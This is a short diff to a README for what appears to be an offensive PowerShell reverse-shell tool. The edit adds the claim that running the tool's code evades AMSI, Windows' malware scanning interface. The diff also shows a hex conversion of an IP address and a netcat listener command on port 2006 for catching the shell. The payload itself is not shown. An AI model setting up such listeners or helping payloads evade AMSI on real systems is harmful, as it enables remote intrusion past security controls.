@@ -11,7 +11,8 @@ printf "%x,%x,%x,%x\n" 192 168 0 1
   <img src="/Screenshot/IP.png">
 </p>
 
-### Now, if you start a netcat listener on port 2006, and enter the above code into PowerShell
+### Now, if you start a netcat listener on port 2006, and enter the above code into PowerShell, it evades AMSI.
+
 
 ```bash
 nc -lnvp 2006
